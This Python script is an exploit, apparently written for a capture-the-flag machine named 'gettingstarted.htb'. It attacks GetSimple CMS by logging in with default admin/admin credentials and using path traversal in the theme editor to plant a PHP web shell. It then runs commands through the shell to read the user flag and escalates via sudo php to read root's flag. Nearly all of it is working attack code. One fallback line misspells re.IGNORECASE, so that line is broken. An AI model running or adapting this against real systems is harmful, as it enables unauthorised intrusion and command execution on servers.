#!/usr/bin/env python3
import sys
import os
import urllib.parse
import re

try:
    import requests
except ImportError:
    print("[-] Error: 'requests' module is not installed.")
    print("[*] Please install it via 'pip install requests' or run within a virtual environment.")
    sys.exit(1)

target_input = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET", "gettingstarted.htb")

if not target_input.startswith(("http://", "https://")):
    base_url = f"http://{target_input.rstrip('/')}/"
else:
    base_url = f"{target_input.rstrip('/')}/"

parsed_target = urllib.parse.urlparse(base_url)
target_host = parsed_target.hostname or "gettingstarted.htb"

login_url = base_url + "admin/index.php"
theme_edit_url = base_url + "admin/theme-edit.php"
shell_url = base_url + "shell.php"

session = requests.Session()
if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target_host):
    session.headers.update({"Host": "gettingstarted.htb"})

print(f"[*] Target URL: {base_url}")
print("[*] Retrieving admin login page cookies...")
try:
    session.get(login_url, timeout=10)
except requests.exceptions.RequestException as e:
    print(f"[-] Failed to connect to {login_url}: {e}")
    sys.exit(1)

print("[*] Authenticating to GetSimple CMS admin panel...")
login_data = {
    "userid": "admin",
    "pwd": "admin",
    "submitted": "1"
}
res = session.post(login_url, data=login_data)

if "logout" not in res.text.lower() and "dashboard" not in res.text.lower():
    print("[-] Login failed. Check credentials or target host.")
    sys.exit(1)
print("[+] Logged in successfully!")

print("[*] Fetching theme edit page for CSRF nonce...")
theme_page = session.get(theme_edit_url, params={"f": "template.php"})

nonce_match = re.search(r'name=["\']nonce["\'][^>]*value=["\']([^"\']+)["\']', theme_page.text, re.IGNORECASE)
if not nonce_match:
    nonce_match = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']nonce["\']', theme_page.text, re.IGNORECase)

nonce = nonce_match.group(1) if nonce_match else ""
print(f"[*] Extracted Nonce: {nonce}")

if not nonce:
    print("[-] Error: Nonce could not be found. Exiting.")
    sys.exit(1)

shell_code = (
    "<?php "
    "if(isset($_GET['cmd'])) { "
    "   echo '___START___'; "
    "   passthru($_GET['cmd']); "
    "   echo '___END___'; "
    "   exit(); "
    "} "
    "?>"
)

save_data = {
    "nonce": nonce,
    "edited_file": "../shell.php",
    "content": shell_code,
    "submitsave": "1"
}

print("[*] Deploying standalone shell.php via path traversal...")
save_res = session.post(theme_edit_url, data=save_data)
if save_res.status_code == 200:
    print("[+] Exploit payload sent successfully!")
else:
    print(f"[-] Warning: Status code {save_res.status_code}")

def run_cmd(cmd):
    r = session.get(shell_url, params={"cmd": cmd}, allow_redirects=True)
    match = re.search(r'___START___(.*?)___END___', r.text, re.DOTALL)
    if match:
        return match.group(1).strip()
    return f"[-] Output markers not found. Response snippet:\n{r.text[:300]}"

print("[*] Fetching user.txt flag...")
user_flag = run_cmd("cat /home/*/user.txt 2>/dev/null || find / -name user.txt 2>/dev/null -exec cat {} \\;")
print(f"\n[+] user.txt flag:\n{user_flag}\n")

print("[*] Escalating privileges to root...")
root_flag = run_cmd("sudo php -r \"system('cat /root/root.txt');\" 2>/dev/null || sudo /usr/bin/php -r \"system('cat /root/root.txt');\" 2>/dev/null || sudo cat /root/root.txt 2>/dev/null")
print(f"\n[+] root.txt flag:\n{root_flag}\n")
